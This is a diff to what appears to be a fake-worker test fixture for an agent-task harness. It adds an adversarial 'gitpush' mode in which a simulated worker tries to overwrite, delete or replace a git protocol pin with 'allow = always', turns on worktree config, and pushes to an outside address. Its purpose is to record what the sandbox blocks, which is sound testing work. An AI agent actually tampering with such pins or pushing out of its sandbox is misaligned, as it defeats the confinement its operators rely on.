@@ -22,9 +22,10 @@ task instructions:
 - forge:    tries to overwrite another run's result (``victim``) beside its own
             result directory, records what the sandbox let it do next to
             --out, then happy-min (W26)
-- gitpush:  a grandchild with an EMPTIED env runs ``git push`` over https, and
-            the worker tries to rewrite its worktree's config.worktree;
-            both outcomes recorded next to --out (W31), then happy-min
+- gitpush:  the worker tries to edit, delete or replace the repo's
+            skep-protocol-pin and to turn on worktree config, then a
+            grandchild with an EMPTIED env runs ``git push`` over https;
+            all outcomes recorded next to --out (W31), then happy-min
 - wrongid:  happy, but its result envelope names another task id (W26)
 - liar:     claims completed+passed, but the patch contradicts the recorded
             verification command (G10 re-verification must catch the lie)
@@ -226,6 +227,41 @@ def main() -> int:
         import subprocess
 
         git_bin = shutil.which("git") or "git"
+
+        def rev_parse(flag: str) -> Path:
+            out = subprocess.run(
+                [git_bin, "rev-parse", flag], cwd=workspace, capture_output=True, text=True
+            ).stdout.strip()
+            return Path(out) if Path(out).is_absolute() else Path(workspace, out)
+
+        git_dir = rev_parse("--absolute-git-dir")
+        pin = rev_parse("--git-common-dir") / "skep-protocol-pin"
+        decoy = git_dir / "decoy"
+        unpin = '[protocol]\n\tallow = always\n'
+        tries: dict[str, object] = {}
+
+        def replace() -> None:
+            decoy.write_text(unpin)
+            os.replace(decoy, pin)
+
+        def shared_config() -> None:
+            with Path(pin.parent, "config").open("a") as config:
+                config.write("[extensions]\n\tworktreeConfig = true\n")
+
+        for name, attempt in (
+            ("edit", lambda: pin.write_text(unpin)),
+            ("unlink", pin.unlink),
+            ("replace", replace),
+            ("shared_config", shared_config),
+        ):
+            try:
+                attempt()
+                tries[name] = "done"
+            except OSError as exc:
+                tries[name] = exc.errno
+        # Its own git dir is writable: a config.worktree there is ignored while
+        # the shared config leaves extensions.worktreeConfig off.
+        Path(git_dir, "config.worktree").write_text(unpin)
         pushed = subprocess.run(
             [git_bin, "push", "https://192.0.2.1/x.git", "HEAD:refs/heads/x"],
             cwd=workspace,
@@ -234,30 +270,6 @@ def main() -> int:
             text=True,
             timeout=60,
         )
-        git_dir = subprocess.run(
-            [git_bin, "rev-parse", "--absolute-git-dir"],
-            cwd=workspace,
-            capture_output=True,
-            text=True,
-        ).stdout.strip()
-        pin = Path(git_dir, "config.worktree")
-        decoy = Path(git_dir, "decoy")
-        tries: dict[str, object] = {}
-
-        def replace() -> None:
-            decoy.write_text("")
-            os.replace(decoy, pin)
-
-        for name, attempt in (
-            ("edit", lambda: pin.write_text("")),
-            ("unlink", pin.unlink),
-            ("replace", replace),
-        ):
-            try:
-                attempt()
-                tries[name] = "done"
-            except OSError as exc:
-                tries[name] = exc.errno
         (args.out.parent / f"gitpush-{task_id}.json").write_text(
             json.dumps({"rc": pushed.returncode, "stderr": pushed.stderr, **tries})
         )
